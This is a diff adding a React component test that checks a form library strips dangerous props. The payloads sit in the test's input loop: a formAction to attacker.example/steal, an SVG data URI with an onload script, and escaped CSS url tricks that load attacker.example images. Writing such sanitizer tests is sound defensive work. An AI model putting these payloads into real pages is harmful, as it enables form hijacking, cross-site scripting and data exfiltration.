@@ -76,4 +76,50 @@ describe('schema DOM prop sanitization', () => {
       <FormFactory schema={formWithSection({ ref: 'schema-ref', key: 'schema-key' })} />
     )).not.toThrow();
   });
+
+  it('applies the tag-aware URL, style and form-target rules in default components', () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
+    const field = (props: Record<string, unknown>) => ({
+      $id: 'default-sinks', type: 'object', 'x-component': 'FormContainer', properties: {
+        section: {
+          type: 'object', 'x-component': 'FormSectionContainer', 'x-ui': { order: 1 },
+          properties: {
+            groups: {
+              type: 'object', 'x-component': 'FormSectionGroupContainer',
+              properties: {
+                group: {
+                  type: 'object', 'x-component': 'FormSectionGroup',
+                  properties: {
+                    submit: {
+                      type: 'object', 'x-component': 'FormField', 'x-ui': { order: 1 },
+                      properties: { submit: { type: 'string', 'x-component': 'InputText', 'x-component-props': props } },
+                    },
+                  },
+                },
+              },
+            },
+          },
+        },
+      },
+    } as unknown as FormSchema);
+
+    for (const props of [
+      { type: 'submit', formAction: 'https://attacker.example/steal' },
+      { type: 'image', src: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(origin)"/>' },
+      { style: { backgroundImage: 'image-set("https://attacker.example/x.png" 1x)' } },
+      { style: { backgroundImage: '\\75rl(https://attacker.example/y.png)' } },
+    ]) {
+      const { container, unmount } = render(<FormFactory schema={field(props)} />);
+      const input = container.querySelector('input');
+      expect(input).not.toBeNull();
+      expect(input?.getAttribute('formaction')).toBeNull();
+      expect(input?.getAttribute('src')).toBeNull();
+      expect(container.innerHTML).not.toContain('attacker.example');
+      unmount();
+    }
+
+    const { container } = render(<FormFactory schema={field({ type: 'submit', formAction: '/save' })} />);
+    expect(container.querySelector('input')).toHaveAttribute('formaction', '/save');
+    warn.mockRestore();
+  });
 });
